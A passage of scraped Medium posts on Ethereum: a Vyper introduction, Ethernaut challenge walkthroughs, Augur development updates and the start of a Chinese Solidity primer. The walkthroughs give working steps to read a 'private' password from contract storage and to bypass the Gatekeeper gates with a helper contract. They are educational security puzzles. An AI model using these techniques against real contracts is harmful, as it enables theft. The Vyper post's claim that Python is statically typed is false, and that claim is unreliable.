Vyper smart contracts are created with. Decorators are used to inject extra functionality into each method, scrapping Solidity\u2019s modifiers in the process. We use the familiar __init__ as the contract\u2019s constructor method, which is executed once when the contract is first deployed. Defining contract parameters is clean. With Python being a statically typed language, we define the signatures of each parameter we will be working with at the top of the contract, in a name: scope(type) like fashion, for example:highestBid: public(wei_value)As you can see here with wei_value, Vyper have introduced some Ethereum specific data types \u2014 this is only one of a range of types we can exploit in Vyper smart contracts.Vyper aims to minimise bugs, maximise auditabilityThe wei_value type demonstrates well what Vyper is all about.wei_value is the smallest denomination of Ether. Where decimal numbers are concerned, Vyper have opted to work with real fixed point values, rather than binary fixed point approximations.This demonstrates one of the core principles of Vyper \u2014 minimising room for error.With the belief that we as developers read code more than write it, we want to understand quickly and make contributions without guessing or error. Seeing an actual value rather than an approximation or truncated representation of the value aids in that process; what I am seeing are tangible values.Is Vyper more secure than Solidity?What you may have heard on video blogs or articles online are claims that Vyper is a more secure language than Solidity.Is this true? Not entirely. Although the probability of bugs is reduced, it is still the developers responsibility to ensure secure code.Now, what Vyper does include are some bug contingencies for us \u2014 we can utilise upper bounds for gas consumption, and can utilise bound and overflow checking. These are neat features to minimise bugs, but regardless of the language you adopt, it is still the developer\u2019s responsibility to write readable, maintainable code.The language we use is only a tool, the values of which we can either embrace or ignore. We could utilise Solidity\u2019s more verbose nature to create a great contract; we could also utilise Vyper\u2019s simplified nature to create an equally great contract.Concretely, Solidity and Vyper are both higher level languages that compile into bytecode, which in turn is deployed on the blockchain. A Solidity contract and Vyper contract hosting the same logic will have almost identical bytecode when compiled.So where does the added security lie if not in language contingencies? In the coding practices of the developers. In their development process, testing process, auditing process and documentation \u2014 both inline and through readme\u2019s and change-logs. Seasoned Python developers will be fully aware that well-written code acts as a means of documentation itself; let the code tell the story so comments are not needed \u2014 and when they are, have a detailed docstring with function usage examples.Without digressing too much into code practices, let\u2019s visit some other things you may have heard about Vyper.Vyper in experimentation, not commercially readyWhen I hear this being said, I reply with this: Name me a blockchain that is commercially ready and not in experimentation.Yes, Vyper is experimental and there will be changes. But do not let this stop you from experimenting with Vyper yourself; the facts are as follows:We can install, compile and deploy smart contracts with Vyper today.While Vyper is still in early development, so is every blockchain, including Bitcoin. Examine the disagreements within the Bitcoin community to realise that we are still far from where we need to be for it (and other blockchains) to become mainstream solutions for the world.Vyper and the Ethereum ecosystem is open source. It is constantly in development, proposals are being submitted and fine-tuned before being deployed, on a constant basis. There will be commercial use cases early on (ICO, ownership of virtual goods) that are realised way before others are technically possible (payment systems that compete with the speed and scale of centralised solutions). But they are coming.Vyper is here today; let\u2019s begin using it.There is one other big Vyper myth I will address.Vyper solves the learning curve issue of Solidity = falseIt is important to realise that Vyper is not a fix for the Solidity learning curve theory. It is an alternative to Solidity, not a replacement.The claims that developers will not embrace Solidity because it is yet another language to learn, with another learning curve which will take weeks to learn are simply false. Other blockchain groups have used this theory as a marketing tactic to create a perception of a weakness within Ethereum. But ultimately, Solidity is not hard to learn.Solidity adheres to object oriented design patterns developers will be familiar with from every other object oriented language out there. A developer could, without issue, read through the Solidity documentation and study the smart contract examples in a matter of hours, before adopting the basic ERC-20 contract or similar contracts.What Vyper does is offer an alternative smart contract language that aims to solve completely different issues to the issue of learning difficulty.Now, let\u2019s move onto what Vyper offers us on a more feature based level.What Vyper OffersVyper offers us a full smart contract development solution. The Vyper compiler is written in Python, whereas the Solidity compiler is C++ based. Although C++ is dramatically faster than Python, speed is traded with consistency in the Vyper pipeline.Like Solidity, there is an online IDE for Vyper, at https://vyper.online. Vyper can also be integrated into a Truffle development workflow, allowing you to test Vyper contracts on local private blockchains very easily.Apart from the syntax and core principles we have talked about, there are other big differences to Solidity. They are listed on Vyper\u2019s Github home page, but for completeness here are the main differences:No modifiers. Modifiers can add complexity and make code less readable \u2014 this goes against Vypers goal of making code as readable as possible. We don\u2019t want to worry about understanding the rules of precedence within our contracts when conflicts occur, nor do we want to jump around numerous contract files to find where those conflicts occur.No inline assembly. The idea of compiled code inside of Vyper code is a big no no. Variables will be represented differently making it impossible to CMD+F all instances of them. The switching of syntax also makes the code less readable.No function overloading. The last thing we want to do is worry about which version of a function is being called, creating confusion when errors occur and time wasted troubleshooting inconsistencies.No operator overloading. Vyper argue using such syntax as += looks misleading. Operator overloading is also not Pythonic.No class inheritance. Again, jumping through multiple files to understand what the code is doing is anti-Vyper.No recursive calling and no infinite loops. These are dangerous when we need to spend gas for every contract operation, greatly increasing the probability of gas attacks.No binary fixed points. As discussed above, Vyper opts to display values as an exact representation.It almost feels as though Vyper thought Solidity was a way too verbose language given the lack of experience the world has had with smart contract development. After all, once a contract is on the blockchain we cannot change it. If a bug is discovered our only option is to replace the entire contract, which comes with major migration difficulties and expenses associated with doing so.So what Vyper is saying is, let\u2019s take a step back and focus on what we have learnt so far \u2014 maybe readability, auditability, simplicity (and therefore security) are far more important than issues like language robustness at this moment in time.Now the community have the option to make that call.Vyper SyntaxHere we will outline some interesting ways we can code smart contracts with the pythonic Vyper.The best way to familiarise yourself with Vyper syntax is visiting the Vyper by Example documentation page, where a range of example contracts are included for us with comprehensive breakdowns. The examples range from an auction / bidding use case, product purchasing, crowdfunding, voting and company share management.Contract variables and selfWe can access contract variables from any function with self. For Vyper contracts, it is recommended we define all contract variables at the top of the contract.Examining the auction contract on the Vyper examples page, we are defining the beneficiary, auctionStart and auctionEnd contract variables by providing the _beneficiary and _bidding_time arguments for the __init__ method:beneficiary: public(address)auctionStart: public(timestamp)auctionEnd: public(timestamp)@publicdef __init__(_beneficiary: address, _bidding_time: timedelta):    self.beneficiary = _beneficiary    self.auctionStart = block.timestamp    self.auctionEnd = self.auctionStart + _bidding_timeAlso use self to call other methods within the contract, with self.<method_name>()Data typesVyper provide a dedicated page for the types it supports. Along with common types such as booleans, signed ints, unsigned ints, decimals, strings and byte arrays, we also have access to some other Vyper smart contract specific types:timestamp and timedelta: These are both unix based (uint256) time values. timedelta represents a period of time, and can be added to a timestamp value. We can also add 2 timedelta together, but cannot add 2 timestamp together \u2014 this is logically incorrect, as a timestamp represents a certain point in time. For time manipulations timedelta is the type to use, such as the bidding time period on the auction contract.address: The address type holds an Ethereum address. We can also gather the balance of an address with _address.balance, and the code size of the address with _address.codesize.Note: variable names prefixed with underscores are used throughout the Vyper documentation, which represent a local method variable where a contract variable may have the same name, as to not confuse ourselves between the two. They can also be used to distinguish a variable from a type declaration.wei_value: We touched on this type above, which is the amount of Ether in wei, of base type uint256.Custom types with units{}: Custom types can also be defined with a base type. For example, if we needed units in say, kph (kilometres per hour), we could define a custom type for this:#define custom typesunits = {    kph: 'kilometres per hour'}#use custom typecarSpeed: int128(kph)Structs: useful for defining custom data structures that consist of multiple variables:car: {   owner: address   value: wei_value,   maxSpeed: int128(kph)}_car.owner = msg.sendermsg and contract objectsLike Solidity, Vyper gives us access to the msg variable within every function defined in the contract. We can access its member variables sender and value to retrieve details of the address that called the contract \u2014 sender being the Ethereum address, and value being the amount of Ether the user sent with the call (or transaction \u2014 every interaction with a smart contract entails a transaction to take place).assertAssert throws an error if a certain condition is not met, and is used at the beginning of methods to check if criteria are met for the method to process. If not the transaction is reverted and the contract terminates.assert is commonly used to check if a user has a sufficient balance to carry out a transaction:assert msg.value <= self.car.valueAnother more unique example of this is within the refund method of the crowdfunding Vyper contract:def refund():   assert block.timestamp >= self.deadline and self.balance < self.goal    ...The contract is reverted if 2 things happen here:If the block timestamp \u2014 the timestamp of the current block of the Ethereum blockchain we happen to be on \u2014 is greater than the deadline of the crowdfunding campaign. Because we do not want activity carried out once the campaign has ended.And if the contract balance has not reached the goal of the campaign. Because if the campaign\u2019s goal was reached the funds should no longer be accessible for refunds.Overall, asserting is widely used as a clean way to condition methods.EventsEvents are an important part of the Ethereum EVM / web3 ecosystem whereby web applications can listen out for events that happen on the blockchain and react to them.In the example contracts, Vyper define events after our custom units{} but before contract variables. Take a look at a Transfer event that takes the following form:Transfer: event({_from: indexed(address), _to: indexed(address), _value: uint256(currency_value)})This Transfer event emits the from address, to address and value of the transfer. These key value pairs are wrapped in a JSON like format with curly braces which provide the only argument to the event() function:<NameOfEvent>: event({nKey: nValue, ...});Events are undoubtedly very useful for letting web3 based applications know the state of your contract execution.__default__ methodThe __default__ method is executed when a call to the contract is made without a function identifier, or if the supplied identifier did not match any within the contract. __default__ must be annotated with @public. It cannot have arguments and cannot return anything.AnnotationsAnnotations (or decorators) of methods allow us to define whether they are public or private, as well as other configurations such as payable and constant that are Ethereum specific. Decorators inject more functionality into methods in a clean, concise way.Most methods you define will be public and take the following form:@publicdef myMethod():   ...We can annotate methods with any number of decorators too. Consider adding the constant decorator, which means the method only reads the blockchain without modifying its state \u2014 think readonly.@public@constantdef myReadMethod():   ...@payable is another useful decorator. If the method is annotated as @payable, it is executed whenever the contract is sent Ether (without data). __default__ would most likely need to be executed in this case:@payable@publicdef __default__():    ...Built in functionsIt is important to remember that Vyper does not include all of Python 3, so familiarising yourself with the built in functions available will save on unintended errors, which can be found here.As a general rule, if you are unsure on what syntax to use \u2014 think Python. Vyper\u2019s online IDE will flag errors and warnings should mistakes be made, making experimentation a good way to get to grips with Vyper smart contracts.Installing VyperVyper is available to download, compile and install on all major operating systems. It is highly recommended to install it within a Python virtual environment. As well as compiling from source, we can also use pip to install vyper:pip install vyperAnd also have access to a Docker image:docker pull ethereum/vyperVyper have a dedicated page for installation. Without repeating too much of the content, I recommend visiting it to see details for your preferred installation method:Installing Vyper \u2014 Vyper documentationVyper can only be built using Python 3.6 and higher. If you are already running Python 3.6, skip to the next section\u2026vyper.readthedocs.ioIf an installation issue crops up on your system, be sure to let the developers know\u2014 post an issue on Github for the community to work through. If you do encounter an error, you can still experiment with https://vyper.onlnie while you await collaboration on your issue.And this wraps up this introductory talk on Vyper. Be sure to review the documentation to familiarise yourself with everything the language offers (and does not offer).I am also interested in hearing what other developers think of Vyper \u2014 let me know in the comments or on social media.Refer to the following links to work your way through the documentation and Github project:Vyper DocumentationVyper is a contract-oriented, pythonic programming language that targets the Ethereum Virtual Machine (EVM)\u2026vyper.readthedocs.ioGithub: ethereum/vyperPythonic Smart Contract Language for the EVM. Contribute to ethereum/vyper development by creating an account on\u2026github.com/ethereum/vyper", "responses": 2, "tags": ["Ethereum", "Python", "Programming", "Software Engineering", "Smart Contracts"]}, {"title": "Ethernaut Lvl 8 Vault Walkthrough \u2014 How to read \u201cprivate\u201d variables in contract storage (with Truffle)", "post_link": "https://medium.com/coinmonks/how-to-read-private-variables-in-contract-storage-with-truffle-ethernaut-lvl-8-walkthrough-b2382741da9f?source=search_post", "author_name": "Nicole Zhu", "author_link": "https://medium.com/@nicolezhu", "publish_date": "2018-08-24", "last_modified_date": "2018-09-17", "readtime": "2.29", "claps": 47, "voters": 13, "content": "Ethernaut Lvl 8 Vault Walkthrough \u2014 How to read \u201cprivate\u201d variables in contract storage (with Truffle)This is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. We learn key Solidity concepts to solve the puzzles 100% on your own.Nicole ZhuFollowAug 24, 2018 \u00b7 3 min readIn this level, we learn to read contract storage with Truffle console, to unlock a vault with a \u201cprivately\u201d stored password.How Ethereum Storage worksstorage in Ethereum programming can mean 2 different things:how Ethereum stores contract data on the blockchain, andhow Solidity stores global and local variables.In this post, we\u2019re dive into how Ethereum stores data on the blockchain.Storage on Ethereum blockchain is 2\u00b2\u2075\u2076 slots, and each slot is 32 bytes.Each smart contract has its own storage to reflect the state of the contract. The values in storage persist across different function calls. And each storage is tethered to the smart contract\u2019s address.How data is physically storedData is stored sequentially in these slots, in order of declaration.Storage is optimized to save byte space. So if sequential variables will fit in a single 32-byte slot, they will share the same slot, indexing from the least significant bits (from the right).A visualisation of this Ethereum storage and space optimization:Notice that bool and uint16 share slot 0, indicating this contract also costs less gas to instantiate!Accessing storageConveniently, Web3 allows you to reach into contract storage via: web3.eth.getStorageAt(contractAddress, slotNumber)Detailed WalkthroughLevel SetupNotice you cannot step through the Remix debugger with live contracts. So let\u2019s use a more powerful tool to interact with this contract. Follow this 8 minute Truffle & Ropsten tutorial to get acquainted with interacting with contracts using Truffle framework.Solution2. Compile your Vault.sol contract to get the local ABI. You can just deploy to local network \u2014 just make sure Ganache is open:truffle deploy   // auto compiles and deploys to local networkThe EVM will save your compiled contract inside the /build.3. Open truffle console to Ropsten:truffle console --network Ropsten4. Notice that the \u201cprivate\u201d password is stored in the slot 2, at index 1Access the storage slot belonging to the contract instance (deployed by Ethernaut) at index 1, by:web3.eth.getStorageAt(instance.address, 1, (err,res)=>{console.log(res)});Note: getStorageAt returns a promise.5. Use a hex-to-string converter, or the web3.utils.hexToAscii helper function to convert the bytes32 variable into a human readable text, which reveals \u201cA very strong secret password :)\u201d6. unlock() your contract with the bytes32 private passwordKey Security TakeawaysAll storage is publicly visible on the blockchain, even your private variables!Never store passwords and private keys without hashing them firstWhen using a delegatecall with contracts with storage variables, be careful about data corruption.More LevelsEthernaut Lvl 7 Force Walkthrough \u2014 How to selfdestruct and create an Ether blackholeThis is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. We learn key Solidity concepts to\u2026medium.comEthernaut Lvl 9 King Walkthrough: How bad contracts can abuse withdrawalsThis is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. We learn key Solidity concepts to\u2026medium.com", "responses": 1, "tags": ["Ethereum", "Blockchain", "Dapps", "Security", "Tutorial"]}, {"title": "Augur Weekly Development Update \u2014 May 2nd", "post_link": "https://medium.com/@AugurProject/augur-weekly-development-update-may-2nd-3b523e160680?source=search_post", "author_name": "Augur", "author_link": "https://medium.com/@AugurProject", "publish_date": "2018-05-03", "last_modified_date": "2018-06-21", "readtime": "1.61", "claps": 169, "voters": 11, "content": "Augur Weekly Development Update \u2014 May 2ndAugurFollowMay 3, 2018 \u00b7 2 min readToday the Ethereum Foundation Grants Program announced that they will be co-sponsoring an extensive audit of the Solidity compiler with us, performed by Zeppelin. It is planned to begin at the end of May and to run for about sixteen weeks. Augur has no dependency on this audit, and in no way does it effect Augurs development schedule. This is an extra service that we believe should be performed, effecting the entirety of the Ethereum ecosystem.We\u2019ve been putting bounties up on Gitcoin and they\u2019re being completed faster than we had ever imagined! We\u2019ve had Trezor authentication support, one-click Heroku and Digital Ocean deployments, and integration with four separate Solidity analyzers all bountied in under two weeks. Thank you to everybody who\u2019s been participating, we will continue to add more this week.Internally, we\u2019re finalizing launch/deployment details and plan to have an update for the public soon about the process and when it\u2019s going to happen. The REP token contract will need to have its balances frozen and migrated to a new REP token contract for Augur\u2019s launch. There is nothing REP token holders will need to do, with an exception for Ether/ForkDelta, IDEX and OasisDEX users. Full details will come in its own blog post, addressing everything around deployment and the migration process.The bounty program is rolling and accepting all submissions. Test out the UI at dev.augur.net, take a look at our Github, and let us know your feedback!Come chat with us in Discord and follow our Twitter for the latest updates.Track our development progress on Github or in the #dev channel of Discord.Updated Repositories:AugurProject/augur-coreaugur-core \u2014 Augur back-end (Ethereum contracts)github.comAugurProject/auguraugur | clientgithub.comAugurProject/augur.jsaugur.js \u2014 Augur JavaScript APIgithub.comAugurProject/augur-nodeaugur-node \u2014 Public Augur node for serving market datagithub.comAugurProject/docsdocs \u2014 Augur documentationgithub.comAugurProject/whitepaperwhitepaper \u2014 The Augur Project Whitepapergithub.comCheers,The Augur Team", "responses": 0, "tags": ["Blockchain", "Augur", "Bitcoin", "Ethereum", "Prediction Market"]}, {"title": "Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodes", "post_link": "https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2?source=search_post", "author_name": "Nicole Zhu", "author_link": "https://medium.com/@nicolezhu", "publish_date": "2018-09-10", "last_modified_date": "2018-10-30", "readtime": "4.60", "claps": 46, "voters": 12, "content": "Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodesThis is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. We learn key Solidity concepts to solve the puzzles 100% on your own.Nicole ZhuFollowSep 10, 2018 \u00b7 5 min readThis level requires some assembly programming to deploy a tiny contract to the EVM.Let\u2019s break this down :)What happens during contract creationRecall that during contract initialization, the following happens:1. First, a user or contract sends a transaction to the Ethereum network. This transaction contains data, but no recipient address. This format indicates to the EVM that is a contract creation, not a regular send/call transaction.2. Second, the EVM compiles the contract code in Solidity (a high level, human readable language) into bytecode (a low level, machine readable language). This bytecode directly translates into opcodes, which are executed in a single call stack.Important to note: contract creation bytecode contains both 1)initialization code and 2) the contract\u2019s actual runtime code, concatenated in sequential order.3. During contract creation, the EVM only executes the initialization code until it reaches the first STOP or RETURN instruction in the stack. During this stage, the contract\u2019s constructor() function is run, and the contract has an address.3.1. After this initialization code is run, only the runtime code remains on the stack. These opcodes are then copied into memory and returned to the EVM.5. Finally, the EVM stores this returned, surplus code in the state storage, in association with the new contract address. This is the runtime code that will be executed by the stack in all future calls to the new contract.Put simplyTo solve this level, you need 2 sets of opcodes:Initialization opcodes: to be run immediately by the EVM to create your contract and store your future runtime opcodes, andRuntime opcodes: to contain the actual execution logic you want. This is the main part of your code that should return 0x42 and be under 10 opcodes.At this point, to independently solve this level, you can read in depth about opcodes and smart contract deconstruction (from the author of this Ethernaut level).For a bit more guidance, let\u2019s press on\u2026Detailed Walkthrough0. Power up truffle console with Ropsten (or your preferred setup) to be able to directly deploy bytecode to the EVM. And open up this bytecode <> opcode conversion chart for easy reference.Runtime Opcodes \u2014 Part 1First, let\u2019s figure out the runtime code logic. The level constrains you to only 10 opcodes. Luckily, it doesn\u2019t take more than that to return a simple 0x42.Returning values is handled by the RETURN opcode, which takes in two arguments:p: the position where your value is stored in memory, i.e. 0x0, 0x40, 0x50 (see figure). Let\u2019s arbitrarily pick the 0x80 slot.s: the size of your stored data. Recall your value is 32 bytes long (or 0x20 in hex).Recall that Ethereum memory looks like this, with 0x0, 0x10, 0x20\u2026 as the official position references:Every Ethereum transaction has 2\u00b2\u2075\u2076 bytes of (temporary) memory space to work withBut\u2026 this means before you can return a value, first you have to store it in memory.First, store your 0x42 value in memory with mstore(p, v), where p is position and v is the value in hexadecimal:6042    // v: push1 0x42 (value is 0x42)6080    // p: push1 0x80 (memory slot is 0x80)52      // mstore2. Then, you can return this the 0x42 value:6020    // s: push1 0x20 (value is 32 bytes in size)6080    // p: push1 0x80 (value was stored in slot 0x80)f3      // returnThis resulting opcode sequence should be 604260805260206080f3. Your runtime opcode is exactly 10 opcodes and 10 bytes long.Initialization Opcodes \u2014 Part 2Now let\u2019s create the contract initialization opcodes. These opcodes need to replicate your runtime opcodes to memory, before returning them to the EVM. Recall that the EVM will then automatically save the runtime sequence 604260805260206080f3 to the blockchain \u2014 you won\u2019t have to handle this last part.Copying code from one place to another is handled by the opcode codecopy, which takes in 3 arguments:t: the destination position of the code, in memory. Let\u2019s arbitrarily save the code to the 0x00 position.f: the current position of the runtime opcodes, in reference to the entire bytecode. Remember that f starts after initialization opcodes end. What a chicken and egg problem! This value is currently unknown to you.s: size of the code, in bytes. Recall that 604260805260206080f3 is 10 bytes long (or 0x0a in hex).3. First copy your runtime opcodes into memory. Add a placeholder for f, as it is currently unknown:600a    // s: push1 0x0a (10 bytes)60??    // f: push1 0x?? (current position of runtime opcodes)6000    // t: push1 0x00 (destination memory index 0)39      // CODECOPY4. Then, return your in-memory runtime opcodes to the EVM:600a    // s: push1 0x0a (runtime opcode length)6000    // p: push1 0x00 (access memory index 0)f3      // return to EVM5. Notice that in total, your initialization opcodes take up 12 bytes, or 0x0c spaces. This means your runtime opcodes will start at index 0x0c, where f is now known to be 0x0c:600a    // s: push1 0x0a (10 bytes)600c    // f: push1 0x?? (current position of runtime opcodes)6000    // t: push1 0x00 (destination memory index 0)39      // CODECOPY6. The final sequence is thus:0x600a600c600039600a6000f3604260805260206080f3Where the first 12 bytes are initialization opcodes and the subsequent 10 bytes are your runtime opcodes.7. In Truffle console, create your contract with the following commands:> var account = \"your address here\";> var bytecode = \"0x600a600c600039600a6000f3604260805260206080f3\";> web3.eth.sendTransaction({ from: account, data: bytecode }, function(err,res){console.log(res)});8. Look up the newly created contract address from the returned transaction hash. You can do this via Etherscan or via getTransactionReceipt(hash).9. In the Ethernaut web console, simply input the following to pass the level:await contract.setSolver(\"contract address\");To learn more SolidityCheck out Solidity Koans to learn more Solidity through test driven development. The plan is to open-source this soon, so all user feedback are welcome!Recommended ReadingsFor all previous levels, start here.To dive deeper into the wonderful world of Solidity assembly, I recommend the following articles:Deconstructing a Solidity Contract \u2014Part I: IntroductionBy Alejandro Santander in collaboration with Leo Arias.blog.zeppelin.solutionsSolidity Bytecode and Opcode BasicsAs we go deeper into writing smart contracts, we will come across terminologies like \u201cPUSH1\u201d, \u201cSSTORE\u201d, \u201cCALLVALUE\u201d\u2026medium.com", "responses": 2, "tags": ["Ethereum", "Smart Contracts", "Tutorial", "Programming", "Technology"]}, {"title": "Ethernaut Lvl 13 Gatekeeper 1 Walkthrough: How to calculate smart contract gas consumption (and byte masking)", "post_link": "https://medium.com/coinmonks/ethernaut-lvl-13-gatekeeper-1-walkthrough-how-to-calculate-smart-contract-gas-consumption-and-eb4b042d3009?source=search_post", "author_name": "Nicole Zhu", "author_link": "https://medium.com/@nicolezhu", "publish_date": "2018-09-04", "last_modified_date": "2018-09-17", "readtime": "4.40", "claps": 38, "voters": 12, "content": "Ethernaut Lvl 13 Gatekeeper 1 Walkthrough: How to calculate smart contract gas consumption (and byte masking)This is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. We learn key Solidity concepts to solve the puzzles 100% on your own.Nicole ZhuFollowSep 4, 2018 \u00b7 5 min readIn this level, you estimate gas and mask your bytes to pass three different gates. The concepts behind Gate 1 is explained here in detail.How to count gasIn Ethereum, computations cost money. This is calculated by gas * gas price, where gas is a unit of computation and gas price scales with the load on Ethereum network. The transaction sender needs to pay the resulting ethers for every transaction she/it invokes.Complex transactions (like contract creation) costs more than easier transactions (like sending someone some Ethers). Storing data to the blockchain costs more than reading the data, and reading constant variables costs less than reading storage values.Stepping through Solidity assembly (Gate 2)Specifically, gas is assigned at the assembly level, i.e. each time an operation happens on the call stack. For example, these are arithmetic operations and their current gas costs, from the Ethereum Yellow Paper (Appendix H):Where \u03b4: gas to remove from the stack; \u03b1: gas to add to the stackLet\u2019s use Remix IDE to step through the following simple contract:pragma solidity ^0.4.24;contract SimpleContract {    function add() public pure returns (uint) {        uint a = 1;         uint b = 2;         return (a+b);    }}In Javascript VM, deploy this contract, invoke add(), and click the on the debug enabler in Remix console to bring up debugger UI:Enable both Instructions and Step detail drop downs as you step into each assembly opcode.Notice how the gas values in Step detail correspond to the opcodes chart in the yellow paper. In this case, the opcode ADD costs 3 gas, as predicted.Important to knowDifferent Solidity compiler versions will calculate gas differently. And whether or not optimization is enabled will also affect gas usage. Try changing the compiler defaults in Settings tab to see how remaining gas will change.Before starting this level, make sure you have configured Remix to the correct compiler version.Datatype conversionsThe second piece of knowledge you need to solve this level is around data conversions. Whenever you convert a datapoint with larger storage space into a smaller one, you will lose and corrupt your data.Byte masking (Gate 3)Conversely, if you want to intentionally achieve the above result, you can perform byte masking. Solidity allows such bitwise operations for bytes and ints as follows:bytes4 a = 0xffffffff;bytes4 mask = 0xf0f0f0f0;bytes4 result = a & mask ;   // 0xf0f0f0f0You are now ready to solve this level!Detailed WalkthroughPass Gate 1Similar to Ethernaut level 4, you can pass Gate 1 by simply letting your contract be the middleman. Create a contract called Hack.sol which accesses your level instance:contract Hack {    GatekeeperOne gate = GatekeeperOne(//YOUR ADDR);    ...}Pass Gate 32. Gate 3 takes in an 8 byte key, and has the following requirements:require(uint32(_gateKey) == uint16(_gateKey));require(uint32(_gateKey) != uint64(_gateKey));require(uint32(_gateKey) == uint16(tx.origin));This means that the integer key, when converted into various byte sizes, need to fulfil the following properties:0x11111111 == 0x1111, which is only possible if the value is masked by 0x0000FFFF0x1111111100001111 != 0x00001111, which is only possible if you keep the preceding values, with the mask 0xFFFFFFFF0000FFFF3. Calculate the key using the0xFFFFFFFF0000FFFF mask:bytes8 key = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;Pass Gate 2Finally, to pass Gate 2\u2019s require(msg.gas % 8191 == 0), you have to ensure that your remaining gas is an integer multiple of 8191, at the particular moment when msg.gas % 8191 is executed in the call stack.4. Since you\u2019ll be calculating gas, first figure out your contract instance\u2019s compiler version & settings. In Etherscan, look up your contract instance by its address.5. Notice GatekeeperOne was compiled with version v0.4.18 with no optimization enabled. Update your Remix settings accordingly.6. Create a function which will call enter() and allocate a specified amount of gas. You should invoke enter() with the lower level call function, which gives you more control over gas usage. Allocate some arbitrary amount of gas:function hackGate() public {    gate.call.gas(99999)(bytes4(keccak256('enter(bytes8)')), key);}7. Step through the Remix debugger in JavaScript VM until you reach the correct opcode (when the Remix IDE highlights over msg.gas % 8191).8. Count the remaining gas and work backwards to arrive at the correct original gas allocation. And replace the call gas allocation with your new value.Note: You may have to do step 8 for 1\u20132 iterations before your remaining gas % 8191 becomes 0.6. Toggle Remix back to Injected Web3 and you should now be able to pass GatekeeperOne!Key Security TakeawaysAbstain from asserting gas consumption in your smart contracts, as different compiler settings will yield different results.Be careful about data corruption when converting data types into different sizes.Save gas by not storing unnecessary values. Pushing a value to state MSTORE, MLOAD is always less gas intensive than store values to the blockchain with SSTORE, SLOADSave gas by using appropriate modifiers to get functions calls for free, i.e. external pure or external view function calls are free!Save gas by masking values (less operations), rather than typecastingMore LevelsEthernaut Lvl 12 Privacy Walkthrough: How Ethereum optimizes storage to save space and be less\u2026This is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. We learn key Solidity concepts to\u2026medium.comEthernaut Lvl 14 Gatekeeper 2 Walkthrough: How contracts initialize (and how to do bitwise\u2026This is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. We learn key Solidity concepts to\u2026medium.com", "responses": 1, "tags": ["Ethereum", "Blockchain", "Smart Contracts", "Dapps", "Tutorial"]}, {"title": "Augur Weekly Development Update \u2014 September 13th", "post_link": "https://medium.com/@AugurProject/augur-weekly-development-update-september-13th-6090eaea69ec?source=search_post", "author_name": "Augur", "author_link": "https://medium.com/@AugurProject", "publish_date": "2017-09-14", "last_modified_date": "2018-06-13", "readtime": "1.53", "claps": 80, "voters": 13, "content": "Augur Weekly Development Update \u2014 September 13thAugurFollowSep 14, 2017 \u00b7 2 min readOur migration to Solidity is just about complete (\ud83c\udf89), with one outstanding PR remaining. After this, there will be no more legacy Serpent code in augur-core. The migration took us just about six weeks (our initial estimation), thus keeping us right on track. Next comes completing the remaining fixes and todos in the new Solidity contracts, along with formalizing our deployment processes.The v3 client served at dev.augur.net received a few updates this past week, including the side navigation menus and market preview cards. Ledger and Trezor support for account authentication is in the works. The create market process and market page are up for re skinning next.Augur : Main Topics PageFeedback and discussion is welcomed in our Slack channel, and questions on our StackOverflow. Some interesting questions this past week have been:\u201cHow do shares within Augur work?\u201d\u201cAre reports retractable before the end of the reporting period?\u201d\u201cWhat is preventing value of Augur from being copied into another contract?\u201d\u201cWhat does Augurs logo mean?\u201dWith the OmiseGO airdrop occurring today, some attackers tried taking advantage of this by sending direct messages to members in our Slack advertising an Augur REP airdrop. The site they linked was a phishing webpage, designed to steal your private key if you entered it.There is NO Augur airdrop.This is a reminder that there is no Augur airdrop, and that you will never receive official communication from Augur outside of the #announce channel on Slack, our Medium, or Twitter. Don\u2019t trust links, don\u2019t trust Slack DMs, and always ensure you\u2019re on the correct website before interacting with cryptocurrency.Updated Repositories:Augur Contracts (augur-core):AugurProject/augur-coreaugur-core \u2014 Augur back-end (Ethereum contracts)github.comAugur Client Front-End (augur):AugurProject/auguraugur \u2014 Augur front-endgithub.comAugur Documentation (augur-docs):AugurProject/docsdocs \u2014 Augur documentationgithub.comCheers,The Augur Team", "responses": 1, "tags": ["Blockchain", "Augur", "Bitcoin", "Ethereum", "Prediction Market"]}, {"title": "Getting started with Smart Contracts", "post_link": "https://medium.com/blockchain-at-nccu/getting-started-with-smart-contracts-dae376455288?source=search_post", "author_name": "\u9ec3\u51a0\u878d", "author_link": "https://medium.com/@mybaseball52", "publish_date": "2019-05-22", "last_modified_date": "2019-05-22", "readtime": "4.82", "claps": 181, "voters": 9, "content": "Getting started with Smart ContractsSolidity Programming Language\u9ec3\u51a0\u878dFollowMay 22 \u00b7 5 min read\u524d\u8a00\u667a\u80fd\u5408\u7d04\u662f\u4e00\u500b\u53ef\u5728\u4ee5\u592a\u574a\u4e0a\u57f7\u884c\u7684\u7a0b\u5f0f\u78bc\uff0c\u6bcf\u500b\u667a\u80fd\u5408\u7d04\u5be6\u9ad4\u6709\u500b\u5730\u5740\uff0c\u5408\u7d04\u6709\u591a\u5c11 balance \uff0c\u5408\u7d04\u7684\u72c0\u614b\uff0c\u4ee5\u53ca\u8a72\u5408\u7d04\u53ef\u88ab\u5176\u4ed6\u4eba\u6240\u57f7\u884c\u7684\u51fd\u5f0f\u3002\u70ba\u4e86\u958b\u767c\u9019\u4e9b\u667a\u80fd\u5408\u7d04\uff0c\u6211\u5011\u5c07\u4f7f\u7528Solidity\u7de8\u7a0b\u8a9e\u8a00\u3002\u9019\u662f\u4e00\u7a2e\u5c08\u9580\u7528\u65bc\u5728\u4ee5\u592a\u574a\u7db2\u7d61\u4e0a\u5efa\u7acb\u667a\u80fd\u5408\u7d04\u7684\u4e00\u7a2e\u8a9e\u8a00\uff0c\u900f\u904e\u4ee5\u592a\u574a\u865b\u64ec\u6a5f(Ethereum Virtual 